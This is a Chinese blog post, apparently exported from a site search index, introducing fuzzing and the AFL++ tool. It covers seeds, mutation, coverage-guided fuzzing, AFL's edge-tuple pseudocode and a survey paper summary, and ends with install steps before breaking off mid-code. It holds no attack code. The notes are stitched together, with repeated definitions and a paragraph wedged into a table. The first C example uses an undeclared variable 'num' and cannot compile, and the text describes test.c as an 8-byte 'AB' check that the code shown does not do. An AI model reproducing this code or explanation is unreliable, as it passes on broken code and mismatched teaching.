<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AFL模糊测试入门</title>
      <link href="/2025/07/01/fuzz/afl/"/>
      <url>/2025/07/01/fuzz/afl/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玩 Fuzz 也有一段时间了，也是想通过本文对 Fuzz 的原理思想和 AFL 的工具的使用做一个总结。也是对这些内容做一个整理吧。希望可以帮助到后来者。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>整个 fuzzing 流程大致可以拆分为三个部分，分别是：1. seed selection、2. mutation、3. coverage。</p><p>模糊测试的定义：一种通过提供非预期的输入并监视异常结果来发现软件故障的方法。</p><p>模糊测试又称 fuzzing，是一种<strong>软件测试</strong>技术。其核心概念是<strong>自动生成随机输入</strong>到程序中，并监控程序异常（如崩溃、断言失败等），以发现可能的程序错误。</p><p>模糊测试一般是一个自动或半自动的过程，这个过程包括反复操纵目标软件并为其提供处理数据。</p><p>所有的模糊器都可分为两大类：基于变异的模糊器，这种模糊器对已有数据样本应用变异技术以创建测试用例。</p><p>基于生成的模糊器，这种模糊器通过对目标协议或文件格式建模的方法从头开始产生测试用例。</p><p>模糊测试（或模糊测试）是一种自动化软件测试技术，它基于向程序提供随机&#x2F;突变的输入值并监控其异常&#x2F;崩溃。</p><p>覆盖率引导的进化模糊测试：</p><ul><li><p><strong>Evolutionary</strong>: 是一种受进化算法启发的元启发式方法，它基本上包括通过使用选择标准（例如覆盖率）来随时间推移初始子集（种子）的进化和突变。</p></li><li><p><strong>Coverage-guided</strong>: 为了增加发现新崩溃的几率，覆盖率引导式模糊测试程序收集并比较不同输入之间的代码覆盖率数据（通常通过插桩），并选择那些导致新执行路径的输入。</p></li></ul><p>核心原理</p><ul><li><strong>异常输入测试</strong>：向程序提供非预期输入以发现漏洞</li><li><strong>自动化变异</strong>：对有效输入进行随机修改生成测试用例</li><li><strong>覆盖率引导</strong>：通过代码覆盖率优化测试效率(灰盒测试)</li></ul><p>主要类型</p><table><thead><tr><th>类型</th><th>特点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>白盒测试</strong></td><td>需要源码，深度分析内部结构</td><td>源码可用时的深度测试</td></tr><tr><td><strong>黑盒测试</strong></td><td>无需源码，外部输入测试</td><td>闭源软件测试</td></tr><tr><td><strong>灰盒测试</strong></td><td>轻量级插桩，兼顾效率与深度</td><td>大多数现代Fuzzer采用</td></tr><tr><td>模糊测试（Fuzzing）是一种自动化的、用于发现软件缺陷或漏洞的测试技术，主要通过向程序输入随机或不合法的数据来测试其健壮性。模糊测试的核心目标是通过不合理或意外的输入触发程序中的异常行为、崩溃或安全漏洞。</td><td></td><td></td></tr></tbody></table><ul><li>种子：初始输入样本</li><li>变异：通过修改种子生成新输入</li><li>覆盖率：衡量测试覆盖代码路径的指标</li><li>崩溃（crash）：程序因异常输入导致的错误</li></ul><p>举一个简单的例子来讲解什么是模糊测试。如下我们有一段简单的代码，代码接收一个数字的输入，它有一个 Bug 会在输入数字 100 时触发，但我们并不知道这个程序存在这个 Bug。我们可以从输入数字 1 开始不断的尝试，逐次递增输入数字，最终发现在数字递增到 100 时程序崩溃退出。</p><p>以上我们不断输入尝试的行为就是模糊测试。我们输入的第一个数字 1 就是模糊测试的种子，逐次递增数字就是我们模糊测试的变异策略，最后我们发现这个 Bug 后记录下反馈来分析 Bug 产生的原因。</p><p>举个简单例子，文件<strong>test.c</strong>是待测试程序的源代码，该程序从stdin读取8字节后输出，但在输出前会比较输入(<code>input</code>) (1)的前两个字节是否为<code>AB</code>，如果是就会执行有问题的代码(2)，并触发段错误导致程序终止。这里(1)对应真实程序中的某些执行条件，(2)对应存在问题的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> input;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">100</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Critical error triggered!\n&quot;</span>);<br>        <span class="hljs-built_in">abort</span>();  <span class="hljs-comment">// 程序崩溃</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing %d: OK\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实际生产环境中 fuzz 目标往往有数万行乃至百万行代码，逐行检查效率太低，自动化才是王道。此出现了模糊测试。模糊测试自动完成：1. 执行目标程序、2. 输入测试数据、3. 报告执行结果，执行这些操作的程序称为fuzzer，根据开发和执行效率需求，会选择不同语言实现。</p><p>fuzzer.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess  <br>​  <br>target = <span class="hljs-string">&#x27;./test&#x27;</span>  <br>inps = [<span class="hljs-string">&#x27;AA&#x27;</span>, <span class="hljs-string">&#x27;BB&#x27;</span>, <span class="hljs-string">&#x27;BA&#x27;</span>, <span class="hljs-string">&#x27;AB&#x27;</span>]  <br>​  <br><span class="hljs-keyword">for</span> inp <span class="hljs-keyword">in</span> inps:  <br>    <span class="hljs-keyword">try</span>:  <br>        subprocess.run([target], <span class="hljs-built_in">input</span>=inp.encode(), capture_output=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)  <br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError: <span class="hljs-comment"># (1)  </span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bug found with input: &#x27;<span class="hljs-subst">&#123;inp&#125;</span>&#x27;&quot;</span>)  <br>​  <br><span class="hljs-comment"># (输出)  </span><br><span class="hljs-comment"># bug found with input: &#x27;AB&#x27;</span><br></code></pre></td></tr></table></figure><p>在模糊测试出现前，为了验证<strong>程序功能</strong>是否正常，会编写测试脚本或<strong>单元测试</strong>，这与模糊测试的方向不同：前者寻找程序异常，后者仅验证程序功能是否按预期执行。</p><p>这也解释了为什么模糊测试被归类在安全领域。正常情况下用户会按照<strong>预期方式</strong>使用服务，因此通过单元测试就代表服务能正常运行。但并非所有用户都会规范操作，如果程序未对这些非预期操作进行检查，就可能存在漏洞，轻则导致服务终止，重则让攻击者获得主机控制权。模糊测试的概念恰好符合攻击者视角：执行程序并输入随机生成的数据，通过执行结果检查当前输入是否满足触发漏洞的条件。</p><p>简而言之，模糊测试用于发现程序漏洞，帮助开发者及时修复，避免被攻击者利用。</p><p>类型</p><ul><li>基于生成：根据目标格式规范生成输入</li><li>基于变异：对现有输入样本进行随机修改</li><li>灰盒&#x2F;白盒模糊测试：结合代码覆盖率反馈</li></ul><p><img src="/Linux/assets/Pasted%20image%2020250312224245.png"></p><p>灰盒模糊测试的工作流程</p><p><img src="/Linux/assets/Pasted%20image%2020250326185550.png"></p><p>AFL 工作流程</p><p><img src="/Linux/assets/Pasted%20image%2020250326185758.png"></p><p>AFL 的基于一个理论：执行覆盖的代码越多，越有可能触发异常，这里采用边覆盖率代表覆盖代码的多寡</p><p>高级主题：</p><ul><li>覆盖率优化：学习如何利用代码覆盖率反馈提升效率</li><li>符号执行：结合模糊测试与符号执行</li><li>语料库管理：优化种子库，提升变异策略</li><li>漏洞分析：使用调试工具分析崩溃原因</li></ul><h3 id="模糊测试分类"><a href="#模糊测试分类" class="headerlink" title="模糊测试分类"></a>模糊测试分类</h3><p>黑盒、灰盒、白盒 fuzzing</p><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><p>基本块（basic block），是我们在编程时程序在执行时会因为不同的条件执行不同的代码。基本块的关键特性是：执行时从入口指令开始，且不会中途跳出。在控制流图（CFG，Control Flow Graph）中，每个基本块对应一个节点，节点之间的连线表示程序的控制流。</p><p>如下例：</p><p>如果<code>a</code>的值为 1，即输出<code>true</code>，否则输出<code>false</code>。这里就构成了一个基本块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(a==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;true&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;false&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将上述的代码执行逻辑画成程序执行流程的图（CFG）。</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/graphviz.svg"></p><p>代码从<code>Start</code>开始执行，每个方框都代表一个基本块。</p><ul><li>基于生成输入数据fuzz：1.随机 2. 基于模板生成（如HTTP报文 里面各个字段又可分为 固定不变 任意变动 有限变动）</li><li>基于变异-覆盖制导fuzz：样本变异-&gt;触发新路径，感知进程反馈-&gt;基于反馈 变异样本再输入</li></ul><h3 id="基于覆盖率的模糊测试"><a href="#基于覆盖率的模糊测试" class="headerlink" title="基于覆盖率的模糊测试"></a>基于覆盖率的模糊测试</h3><p>coverage-guided fuzzing 原理</p><p>基于覆盖率的模糊测试（Coverage-guided fuzzing）是一种通过测试程序不同代码路径来发现潜在漏洞的自动化技术。这种方法依赖于覆盖率信息，旨在通过不断地生成新的输入数据，覆盖更多的代码路径，从而触发程序中的潜在漏洞。</p><p>工作原理：</p><ol><li><p><strong>初始化</strong>：模糊测试器会生成一些初始输入数据，通常这些输入是随机的或者基于已有的测试样本。然后将这些输入数据提供给目标程序进行测试。</p></li><li><p><strong>执行程序</strong>：每次执行程序时，模糊测试器会监视程序的执行路径。程序执行过程中，会追踪每个基本块（basic block）的覆盖情况。这意味着它会记录哪些代码行被执行过，哪些没有被执行过。</p></li><li><p><strong>收集覆盖率信息</strong>：模糊测试器通过插桩或其他手段，收集程序执行的覆盖率信息，通常包括以下几种形式：</p><ul><li><p><strong>基本块覆盖（Basic Block Coverage）</strong>：追踪程序执行时每个基本块是否被触发。</p></li><li><p><strong>路径覆盖（Path Coverage）</strong>：追踪程序执行的不同路径，帮助了解程序是否遍历了所有可能的路径。</p></li><li><p><strong>分支覆盖（Branch Coverage）</strong>：追踪程序中每个条件分支的执行情况，确保所有的分支条件都得到测试。</p></li></ul></li><li><p><strong>生成新输入</strong>：基于覆盖率信息，模糊测试器会生成新的输入数据，试图覆盖尚未测试的代码路径。通常，模糊测试器会根据当前覆盖的路径选择性地生成新输入，优先尝试覆盖那些尚未触发的代码路径。</p></li><li><p><strong>迭代</strong>：通过不断生成新的输入数据并执行程序，模糊测试器会尽可能多地覆盖程序的代码路径。如果某个输入数据触发了程序中的崩溃或异常行为，模糊测试器将其记录下来，供后续分析。</p></li></ol><p>通常所说的反馈驱动模糊测试（feedback-driven fuzzer）是指模糊测试器（fuzzer）并非随意生成随机输入和变异，而是通过执行结果的好坏来引导下一次生成或选择的输出。根据反馈的来源，可以大致分为两类：</p><ul><li><p><strong>Coverage-guided</strong>（覆盖率引导） - 通过代码覆盖率来引导，执行到的代码越多越好。</p></li><li><p><strong>Data-driven</strong>（数据驱动） - 让特定数据或变量的状态变化越多越好。</p></li></ul><p>大多数模糊测试器都是 <strong>coverage-guided</strong> 类型，其目的是在一定时间内尽可能执行更多的代码。当前较有代表性的覆盖率引导模糊测试器有：</p><h3 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h3><p>代码覆盖率的计量单位，通常有3种：</p><ul><li>函数：代码执行时调用到哪些函数</li><li>基本块：以指令跳转为作划分边界的</li><li>边界：edge相比于基本块多记录了一些执行边界的信息。</li></ul><p>代码覆盖率是模糊测试中一个极其重要的概念，<strong>使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大</strong>，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">官方文档</a>。</p><ul><li>基本块</li></ul><p>缩写为BB，指一组顺序执行的指令，BB中第一条指令被执行后，后续的指令也会被全部执行，每个BB中所有指令的执行次数是相同的，也就是说一个BB必须满足以下特征：</p><ul><li>只有一个入口点，BB中的指令不是任何<strong>跳转指令</strong>的目标。</li><li>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</li></ul><p>例如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块</p><ul><li>边（edge）</li></ul><p>AFL的<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt">技术白皮书</a>中提到fuzzer通过插桩代码捕获边（edge）覆盖率。那么什么是edge呢？我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><ul><li>元组</li></ul><p>具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong> 的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">cur<span class="hljs-number">_</span>location = &lt;COMPILE<span class="hljs-number">_T</span>IME<span class="hljs-number">_</span>RANDOM&gt;;            <span class="hljs-comment">//用一个随机数标记当前基本块</span><br><span class="hljs-keyword">shared</span><span class="hljs-number">_m</span>em[cur<span class="hljs-number">_</span>location ^ prev<span class="hljs-number">_</span>location]++;        <span class="hljs-comment">//将当前块和前一块异或保存到shared_mem[]</span><br>prev<span class="hljs-number">_</span>location = cur<span class="hljs-number">_</span>location &gt;&gt; <span class="hljs-number">1</span>;                <span class="hljs-comment">//cur_location右移1位区分从当前块到当前块的转跳</span><br></code></pre></td></tr></table></figure><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置ecx&#x2F;rcx，然后调用<code>__afl_maybe_log</code>，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。</p><h3 id="AFL-Fuzz流程"><a href="#AFL-Fuzz流程" class="headerlink" title="AFL Fuzz流程"></a>AFL Fuzz流程</h3><p><img src="/Linux/assets/Fuzz%E6%B5%81%E7%A8%8B.drawio.png"></p><p>程序：</p><p>输入、输出，给出反馈</p><ul><li>手动测试</li></ul><p>手动生成 data</p><ul><li>自动化测试</li></ul><p>随机生成data</p><p>基于模板data生成fuzz</p><p>观察进程是否crash</p><p>例子：</p><p>比如对于 http 服务器的模糊测试</p><p>覆盖率模糊测试</p><p>覆盖测试-&gt;感知进程-&gt;路径反馈-&gt;基于反馈变异数据</p><p>AFL 是一种流行的开源模糊测试工具，专门用于发现程序中的漏洞。它主要通过自动化地生成输入数据并将其提供给程序，观察程序的崩溃或异常行为，从而发现潜在的安全漏洞。</p><p>AFL++ 是 AFL 的加强版，旨在解决 AFL 中的一些局限性并增强其功能。AFL++ 保持了 AFL 的大部分功能，但增加了更多的特性和性能优化，使其成为现代模糊测试的更强大工具。所以这里我们直接学习 AFL++。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><p>Fuzz testing（fuzzing，即模糊测试）在检测安全漏洞中大放异彩，其通过生成大量的测试用例（test cases）并观测执行结果来寻找漏洞，并且已在大量的应用中发现了上千个漏洞。虽然非常高效，fuzz 仍缺乏系统化的对其缺陷的分析。</p><ul><li>fuzz 需要缩小输入空间（input space）与缺陷空间（defect space，触发缺陷的输入）间的差距；在一个应用当中，漏洞（defects）的存在是分散的（spare），这意味着 defects space 要比 input space 小得多。</li><li>fuzzing 生成大量的测试用例进行重复测试——这需要一种自动化的方法；由于查询与漏洞的复杂性，自动化地执行不同的程序会是一个挑战。</li></ul><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>软件漏洞是计算机系统中的一个严重的问题，而 Fuzz testing 已经成为最成功的检测程序漏洞的方法之一，其通过生成大量的测试用例来重复测试目标程序并观察其异常（exception）——安全漏洞的标志（indicator）</p><p>Fuzzing 通常有着一组种子（seeds）：interesting inputs，新的输入的生成则基于这组种子进行无限的变异（mutate）</p><p>虽然 fuzzing 在发现安全漏洞上获得了巨大的成功，在开发高效的漏洞检测方案上仍存在着缺陷，如 Fig.1 所示，三个主要的缺陷是：输入中分散的漏洞空间，严格的有效输入空间，多目标的自动化执行。</p><p><img src="/assets/Pasted%20image%2020250621145238.png"></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> 在应用程序中的漏洞分布是分散的，而仅有部分特定的输入能够触发漏洞；浅显的漏洞可以在短时间内被 fuzz 到，但许多安全漏洞需要测试复杂的执行路径并解决严格的路径约束，因此一个高效的 fuzzing 算法需要同时对 <em>待测试程序</em> （program under test， <strong>PUTs</strong>）与 <em>安全缺陷</em> （security flaws）足够精通，以在一个更有可能存在漏洞的代码区域驱动计算资源</li><li><strong>Gap 2: strict valid input space.</strong> 大部分程序有着自己的输入空间，而现代程序都相当复杂，需要更复杂的特化输入空间，因此如何生成有效输入同样是个挑战；此外，为了提高 fuzzing 的效率，生成的输入应当使用不同的执行状态（例如 <em>代码覆盖率</em> ），这需要更先进的方案来生成有效输入；若缺乏对 PUTs 的系统化分析，几乎不可能精确地限制输入空间（例如 PDF 文件的变异生成可能会违反 PDF 规范）</li><li><strong>Gap 3: various target.</strong> 由于 fuzzing 大量重复地测试 PUTs，这需要高效的自动化方法。PUTs 与漏洞都是多种多样的，有的程序可以简单直接地被自动化地 fuzz（例如命令行程序），但许多程序在自动化测试前都需要做大量的工作（例如硬件）；此外，安全缺陷同样需要自动化的 indicator 以记录潜在的真正漏洞，<strong>程序崩溃</strong>是一个常用的 indicator 因为其可以被 OS 自动捕获，但有的安全缺陷<strong>并不会表现出崩溃</strong>（例如条件竞争），这需要精心设计的 indicator</li></ul><p>业界在缩小这些缺陷上做出了许多努力。在本篇论文中，研究者系统化地回顾与分析了 fuzzing 的缺陷与解决方案，同时考虑了广度与深度</p><p>本篇论文目录如下：</p><ul><li><strong>§2</strong>：overview of fuzzing</li><li><strong>§3</strong>：depicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>§4</strong>：analyzes diverse solutions to reduce the search space of inputs</li><li><strong>§5</strong>：analyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>§6</strong>：other some directions for future research</li></ul><h3 id="模糊测试概述"><a href="#模糊测试概述" class="headerlink" title="模糊测试概述"></a>模糊测试概述</h3><p><img src="/assets/Pasted%20image%2020250621145419.png"></p><p>我们首先介绍一些术语（ <strong>Terminologies.</strong> ），如 Fig2 所示：</p><ul><li><strong>seed</strong>：被保留的能完成更好的 fitness 的输入（例如提供新的覆盖率）</li><li><strong>fitness</strong>：对一个 input&#x2F;seed 的质量的测量</li><li><strong>power schedule</strong>：决定了分配给 seeds 的 energy</li><li><strong>energy</strong>：分配给当前 fuzzing round 的变异数量</li><li><strong>fuzzer</strong>：fuzzing 算法的实现</li></ul><p>如 Fig2 所示，fuzzing 由三部分组成：</p><ul><li><strong>input generator</strong>：负责向 executor 提供输入</li><li><strong>executor</strong>：负责执行输入</li><li><strong>defect monitor</strong>：负责检查是否发现了新的执行状态或缺陷（例如 crashes）</li></ul><p>基于输入的生成方式，fuzzing 可以分为：</p><ul><li><strong>基于生成的</strong> （generation-based）：基于 <em>文法</em> （grammars）或 <em>有效语料库</em> （valid corpus）从头开始生成；如 Fig2 所示，其从一组种子中直接获得输入</li><li><strong>基于变异的</strong>（mutation-based）：对现有的种子进行 <em>变异</em> （mutate）以获得新的输入；对给定的一组种子，基于变异的模糊测试通过 seed schedule、byte schedule、mutation schedule 以获得输入</li></ul><blockquote><p>需要注意的是，fuzzing 并不需要经历 Fig2 中的所有步骤，例如基于生成的模糊测试并不执行 byte schedule 或 mutation schedule，但关注于从初始输入文件中选择最优的种子组</p></blockquote><p>基于执行时观测到的信息量，fuzzing 可以分为：</p><ul><li><strong>黑盒</strong>（blackbox）：黑盒模糊测试并不知道每次执行的内部状态，通过使用输入格式化或不同的输出状态来进行优化</li><li><strong>白盒</strong>（whitebox）：白盒模糊测试对每次执行的内部状态是全部得知的，这使其能系统化地探索目标程序的状态空间；其通常使用 concolic execution（例如 <em>dynamic symbolic execution，即动态符号执行</em> ）来分析目标程序</li><li><strong>灰盒</strong>（greybox）：灰盒模糊测试获得的执行状态信息在黑盒与白盒之间，例如许多 fuzzer 都使用 <em>边界覆盖率</em> （edge coverage）作为内部执行状态</li></ul><p>最通用的执行状态便是代码覆盖率（code coverage，例如 CFGs（control flow graphs） 中的基本块（basic block、边（edges）），覆盖率的基本假设用法是：发现更多的执行状态（例如新的覆盖率）能提高发现漏洞的概率。因此 <em>覆盖率指导</em> （coverage-guided）的模糊测试的目标便是覆盖更多的代码。</p><blockquote><p>但执行状态并不限制于代码覆盖率，对面向对象程序（object-oriented programs）而言也可以是执行的合法性（legality），对协议实现（protocol implementations）可以是状态机（state machine），对并发实现（concurrency）可以是 alias coverage，对深度学习模型（deep learning models）可以是神经覆盖率（neuron coverage），对安卓智能电视则可以是执行日志（execution logs）</p></blockquote><p>Fuzzer 通常使用 <em>崩溃</em> （crashes）作为安全漏洞的指示器，因为 crashes 提供了直接的自动记录（OS 会自动发出信号告知程序崩溃），然而有的缺陷并不会显示出 crashes，因此 fuzzer 使用其他的指示器，例如 physical safety violation</p><p>但 indicators 仅显示了可能的安全问题，还需要安全工具或人工确认这是一个 <em>漏洞</em> （vulnerability）</p><h3 id="FUZZING-THEORY"><a href="#FUZZING-THEORY" class="headerlink" title="FUZZING THEORY"></a>FUZZING THEORY</h3><p>为了提高发现漏洞的概率，fuzzer 在执行过程中使用反馈（feedback）机制，例如以执行状态或结果作为 fitnes，一个典型的 fitness 便是基于代码覆盖率（例如基本块或边）进行输入生成，但仅有代码覆盖率<strong>并非一直都是可靠的</strong>，就算可靠也可能收益不高（例如指数型数量的输入生成可能只带来线性的漏洞发现），因此一种常见的改进方法是优化模糊测试的过程或是为 fitness 丰富信息，Table 1 展示了不同的 fuzzer 的优化方法：</p><p><img src="/assets/Pasted%20image%2020250621145854.png"></p><h4 id="Seed-Set-Selection"><a href="#Seed-Set-Selection" class="headerlink" title="Seed Set Selection"></a>Seed Set Selection</h4><p>对种子集的优化关注于<strong>最小化种子集的大小</strong>，例如选择能覆盖所有已发现代码覆盖的一组最少的种子，因为过于富集的种子会在检验已探测代码区域上浪费计算资源</p><blockquote><p>在 <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX 的一篇论文</a> 中其被表述为 <em>最小覆盖集问题</em> （minimal set coverage problem，MSCP）</p></blockquote><h4 id="Seed-Schedule"><a href="#Seed-Schedule" class="headerlink" title="Seed Schedule"></a>Seed Schedule</h4><p><strong>种子调度</strong>（seed schedule）期望解决如下问题：</p><ul><li>在下一轮中选择哪个种子</li><li>为该种子分配的时间预算（time budget）；大部分 fuzzer 实际上选择优化对被选取种子的变异次数</li></ul><p>由于 PUTs 与漏洞的复杂性，未发现代码覆盖率与未发现漏洞是不可知的，我们无法知道一个输入是否能触发漏洞，类似地在检索代码之前我们也不能获得程序行为的概率分布，因此数学上我们几乎不可能找到一个全面的优化解法，因此研究人员基于多种优化方法来近似地解决这个问题</p><h4 id="Fitness-by-Bugs"><a href="#Fitness-by-Bugs" class="headerlink" title="Fitness by Bugs"></a>Fitness by Bugs</h4><p>通常而言在模糊测试过程中使用两种 fitness 进行优化：1）基于漏洞 2）基于执行状态（例如代码覆盖率）</p><p>由于 fuzzing 的目的是发现漏洞，发现漏洞的数量便是一种最简单的 fitness，一种方法便是在随机&#x2F;顺序选择种子的时候调度每个种子的时间预算，在不考虑执行状态的情况下， <em>最大化漏洞数量问题</em> 可以被简化为一个 <strong>整数线性规划</strong>（Integer Linear Programming，ILP）问题，即在线性约束下最大化漏洞数量——以解决这样的 ILP 问题来自动计算每个种子的时间预算</p><p>另外一种认知是将漏洞发现的过程视作 <strong>带权奖券收集问题</strong>（Weighted Coupon Collector’s Problem，<del>不懂的建议翻概率论课本虽然👴的概率论也是挂得一塌糊涂</del>）：fuzzing 中发现的每个独特的漏洞都被视作一种“奖券”，WCCP 期望以此预测发现下个“奖券”所需要的尝试的数量（时间预算）</p><p>ILP 与 WCCP 都是为了将更多的时间于是分配给更有潜力的种子以发现更多漏洞</p><h3 id="SEARCH-SPACE-OF-INPUT"><a href="#SEARCH-SPACE-OF-INPUT" class="headerlink" title="SEARCH SPACE OF INPUT"></a>SEARCH SPACE OF INPUT</h3><h3 id="AUTOMATION"><a href="#AUTOMATION" class="headerlink" title="AUTOMATION"></a>AUTOMATION</h3><h3 id="DIRCTIONS-OF-PUTU"><a href="#DIRCTIONS-OF-PUTU" class="headerlink" title="DIRCTIONS OF PUTU"></a>DIRCTIONS OF PUTU</h3><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>安装 AFL++</p><ul><li>docker镜像</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉取AFL++镜像</span><br>docker pull aflplusplus/aflplusplus<br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行容器</span><br>docker run --name afl -it -d aflplusplus/aflplusplus /bin/bash<br><span class="hljs-meta prompt_"># </span><span class="language-bash">连接容器</span><br>docker exec -it afl /bin/bash<br></code></pre></td></tr></table></figure><ul><li>编译安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AFLplusplus/AFLplusplus.git<br>cd AFLplusplus<br>make<br>make install<br></code></pre></td></tr></table></figure><ul><li>预编译包安装</li></ul><p>Ubuntu 下可以通过 apt 包管理安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install afl++<br></code></pre></td></tr></table></figure><ul><li>下载 Fuzzing101</li></ul><p>在 aflplusplus docker 容器中搭建项目环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /root/<br>git clone https://github.com/antonio-morales/Fuzzing101<br></code></pre></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>通过 Fuzzing101 的第一个练习来学习如何使用 AFL++ 进行 fuzz，以及如何通过 gdb 来分析崩溃。</p><p>我们 AFL 项目中的例子<code>test-instr.c</code>来学习 AFL++ 的基础使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span 